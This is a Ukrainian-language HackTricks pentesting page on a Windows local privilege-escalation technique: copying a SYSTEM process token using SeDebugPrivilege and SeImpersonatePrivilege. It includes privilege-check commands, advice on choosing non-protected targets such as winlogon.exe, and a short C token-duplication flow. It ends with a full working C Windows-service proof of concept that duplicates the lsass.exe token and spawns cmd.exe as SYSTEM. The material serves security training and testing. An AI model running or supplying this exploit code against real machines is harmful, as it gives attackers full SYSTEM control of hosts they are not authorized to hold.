# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці розглядається варіант **manual token-theft**, у якому контекст **High Integrity**, що вже має **`SeDebugPrivilege`** і **`SeImpersonatePrivilege`**, відкриває відповідний процес **SYSTEM**, **дублює його токен** і **запускає новий процес** із цим токеном.

Якщо вам потрібна лише швидка оболонка **SYSTEM** із привілейованого процесу адміністратора, також перегляньте:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Якщо у вас немає шляху через дескриптор процесу, але є **`SeImpersonatePrivilege`**, маршрут через **named-pipe / Potato** зазвичай простіший:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Швидка перевірка

Перш ніж використовувати шлях копіювання токена, переконайтеся, що поточний процес уже перебуває в корисному контексті:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Нотатки:

- **`SeDebugPrivilege`** дає змогу відкривати багато **не захищених** SYSTEM-процесів, навіть якщо їхній DACL зазвичай блокував би доступ.
- **`SeImpersonatePrivilege`** робить подальше використання **`CreateProcessWithTokenW`** практичним.
- Якщо шлях копіювання token надає лише слабкий або відфільтрований SYSTEM token, просто викрадіть його з **іншого SYSTEM-процесу**.

## Ретельно обирайте цільовий процес

Цю техніку зазвичай демонструють на **`lsass.exe`**, але в сучасній Windows це часто **неправильна ціль**:

- Якщо увімкнено **LSA Protection / RunAsPPL**, **`lsass.exe`** є захищеним, і звичайний admin-процес із **`SeDebugPrivilege`** все одно не зможе його відкрити.<sup>[[2]](#references)</sup>
- Віддавайте перевагу **не-PPL SYSTEM-процесам**, таким як **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** або ранньому екземпляру **`svchost.exe`**.
- **Захищені процеси** та деякі спеціальні процеси, як-от **`System`** або **`csrss.exe`**, не є реалістичними user-mode цілями для цієї техніки.
- Використовуйте **Process Hacker / Process Explorer**, запущений із підвищеними правами, щоб перевірити, чи справді token цільового процесу має потрібні вам privileges, перш ніж дублювати його.

## Практично важливі деталі API

Багато публічних PoC запитують **`PROCESS_ALL_ACCESS`** і **`TOKEN_ALL_ACCESS`**, але це створює більше шуму, ніж потрібно. На практиці:

- Відкривайте цільовий процес лише з потрібними правами (зазвичай **`PROCESS_QUERY_INFORMATION`** або **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Відкривайте token із правами, потрібними для створення процесу: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Використовуйте **`DuplicateTokenEx(..., TokenPrimary, ...)`**, щоб створити **primary token**; одного impersonation token недостатньо для створення нового процесу.
- Якщо **`CreateProcessWithTokenW`** завершується помилкою **`1314`**, перейдіть на **`CreateProcessAsUserW`**.
- Якщо запускаєте з **service / Session 0**, пам’ятайте, що **`CreateProcessWithTokenW`** залишає дочірній процес у **сесії викликача**. Якщо потрібна видима desktop shell, використовуйте **`CreateProcessAsUserW`** і перемістіть token до потрібної сесії.<sup>[[1]](#references)</sup>

Мінімальний сучасний flow виглядає так:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Повний service PoC

Наступний код **експлуатує привілеї `SeDebugPrivilege` і `SeImpersonatePrivilege`**, щоб скопіювати token із **процесу, запущеного від імені SYSTEM**, який має **всі привілеї token**. У цьому випадку код можна скомпілювати та використати як **бінарний файл Windows service**, щоб перевірити роботу примітиву.<sup>[[3]](#references)</sup>

Основна частина **коду, де відбувається підвищення привілеїв**, знаходиться всередині функції **`Exploit`**. Усередині цієї функції видно, що виконується пошук **`lsass.exe`**, його **token копіюється**, а потім цей token використовується для запуску нового **`cmd.exe`** з усіма привілеями скопійованого token.

На сучасних хостах часто потрібно замінити **`lsass.exe`** на інший **не-PPL процес SYSTEM**, наприклад **`winlogon.exe`**, **`wininit.exe`** або **`services.exe`**.

Інші процеси, запущені від імені SYSTEM і з усіма або більшістю привілеїв token: **`services.exe`**, **`svchost.exe`** (деякі з перших), **`wininit.exe`**, **`csrss.exe`**... Пам’ятайте, що зазвичай **не вдасться скопіювати token із захищеного процесу**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Посилання

- [1] [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Налаштування додаткового захисту LSA (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Запуск моєї програми як service (cboard.cprogramming.com) – skeleton Windows service, використаний PoC](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
